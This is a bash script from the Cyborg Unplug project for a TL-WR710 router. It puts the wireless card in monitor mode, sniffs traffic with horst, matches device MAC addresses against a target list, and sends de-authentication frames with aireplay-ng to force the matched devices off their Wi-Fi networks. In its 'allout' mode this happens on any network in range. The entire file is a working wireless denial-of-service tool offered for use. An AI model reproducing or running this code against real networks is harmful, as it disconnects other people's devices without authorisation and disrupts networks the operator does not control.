#!/bin/bash

# Cyborg Unplug detector script for the TL-WR710. Detects and de-auths
# user-selected target devices resourced from /www/config/. 
# 
# Copyright (C) 2015 Julian Oliver 
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT
shopt -s nocasematch # Important

LOGS=/www/logs/
CAPDIR=/tmp
CONFIG=/www/config
FRAMES=5 # Number of de-auth frames to send. 10 a good hit/time tradeoff
NETWORKS='' # Placeholder. Technically redundant.
MODE=$(cat $CONFIG/mode) 

# Read in the user selected target devices and build the target string.
SRCT=$(cat $CONFIG/targets | cut -d "," -f 2)
TARGETS='@('$(echo $SRCT | sed 's/\ /\*\|/g')'*)'

# Make the activity page the default site page for connections during detection
# (only available over Ethernet) 
cp /www/active.php /www/index.php
rm -f $LOGS/detected
echo "This is our target list: "$TARGETS > $LOGS/targets

# Set to station mode (taking down 'hostapd') so that we have control of the NIC
uci set wireless.@wifi-iface[0].mode="sta"
uci commit wireless
wifi up
sleep 1 # Important

# Extract and define a variable for our wireless NIC and bring it up in Monitor
# mode. We use $NIC to capture rather than the mon0 device created below. This
# is useful as we can set the channel of $NIC on the fly with iwconfig,
# automatically setting the channel of the mon0 device used to de-auth in turn.
NIC=$(iw dev | grep Interface | awk '{ print $2 }')
ifconfig $NIC down
iwconfig $NIC mode Monitor
ifconfig $NIC up

# Create a monitor device for aireplay-ng to de-auth with. Aireplay will only
# work with an airmon-ng mon device, not $NIC.
airmon-ng stop mon0 && airmon-ng start $NIC 
sleep 2

deauth() {
    echo "Target found."
    # Pause airodump-ng and set the channel
    # We can set the channel of $NIC and mon0 at once as $NIC is in Monitor mode
    horst -x pause
    iwconfig $NIC freq $FREQ"000000"
    sleep 1
    # Log this for the report page
    echo $(date) "de-authed" $STA "on" $BSSID >> $LOGS/detected
    # Do the de-auth
    echo "De-authing: " "$STA" " from " "$BSSID"
    aireplay-ng -0 $FRAMES -a $BSSID -c $STA mon0 
    horst -x resume
    # Reset MAC vars 
    STA=ff:ff:ff:ff:ff:ff
    BSSID=ff:ff:ff:ff:ff:ff
}

channelWalk(){
    # This is only for Territory mode as horst already has a random walk for all
    # channels
    trap "exit" INT
    while true;
        do 
            for c in ${CHANNELS[@]}
                do
                    horst -x channel=$c
                    sleep 1
                done
        done
}

# Start horst with upper channel limit of 13 in quiet mode and a command hook
# for remote control (-X). Has to be backgrounded.
horst -u 13 -q -d 250 -i $NIC -f DATA -o $CAPDIR/cap -X detect &
HPID=$!

if [ $? -ne 0 ]; then # Test horst exit status 
  # Something is wrong, like a dead mon0
  # and/or NIC. Store settings and reboot.
   touch $CONFIG/updated && reboot -n 
fi
#horst -x channel_auto=1

case "$MODE" in 
    *territory*)
        # Override channels with those of target BSSIDs. We have to resource awk
        # twice, due to two cases of uniqueness tested.
        CHANNELS=($(cat $CONFIG/networks | sort -u | awk 'BEGIN { FS = "," }; { print $NF }' | sort -u | awk '{ print $0 }'))
        #CHANNELS=($(cat /www/config/networks | sort -u | awk 'BEGIN { FS = "," }; { print $NF }'))
        # We'll poll for as many seconds as there are networks to guard 
        POLLTIME=$(wc -l < $CONFIG/networks)
        echo "These are the networks we're watching"
        # Read in the networks we're watching and build the target string. 
        SRCN=$(cat /www/config/networks | cut -d "," -f 1)
        NETWORKS='@('$(echo $SRCN | sed 's/\ /\|/g')')'
        channelWalk &
        CPID=$!
    ;;
    *alarm*)
        # Put things specific to alarm/alert mode here.
        POLLTIME=13 # Seconds we wait for capture to find STA/BSSID pairs
        horst -x channel_auto=1
    ;;
    *allout*)
        # Put things specific to allout mode here.
        POLLTIME=13 # Seconds we wait for capture to find STA/BSSID pairs
        horst -x channel_auto=1
    ;;
    *)                    
esac

while true;
        do
            echo "//------------------------------------------------------->"
            echo "Sleeping for " $POLLTIME " and writing capture log"
            sleep $POLLTIME
            # Sort associated clients into temporary pairing files. Channels are
            # not in the probed/association section of airodump-ng and so the
            # pairs need to be extraced and matched separately.
            cat $CAPDIR/cap | awk '{ print $2 $3 $4 $11 }' | sed 's/,/\ /g' | sort -u > $CAPDIR/pairs
            if [ -f $CAPDIR/pairs ]; then
                    kill -STOP $CPID
                     while read line;
                             do
                                ARR=($line) # Array from the line
                                SRC=${ARR[0]}; DST=${ARR[1]}; BSSID=${ARR[2]}; FREQ=${ARR[3]}
                                echo $SRC $DST $BSSID $FREQ

                                if [ $SRC != $BSSID ]; then
                                    STA=$SRC
                                else 
                                    STA=$DST 
                                fi

                                if [[ "$STA" == $TARGETS && "$BSSID" == $NETWORKS && "$MODE" == "territory" ]]; then
                                        echo $line
                                        deauth
                                elif [[ ( "$STA" == $TARGETS || "$BSSID" == $TARGETS ) && "$MODE" == "allout" ]]; then
                                        deauth
                                elif [[ "$MODE" == "alarm" ]]; then 
                                        echo $(date) "detected" $STA "on" $BSSID >> $LOGS/detected
                                else
                                    # Remove redirect during debugging
                                    echo "No targets detected this pair for mode:" $MODE > /dev/null 
                                fi
                        done < $CAPDIR/pairs #EOF
            echo "Removing temporary files."
            rm -f $CAPDIR/pairs $CAPDIR/channels 
            horst -x pause
            kill -CONT $CPID
            rm -f $CAPDIR/cap
            horst -x outfile=$CAPDIR/cap
            horst -x resume 
        fi
done

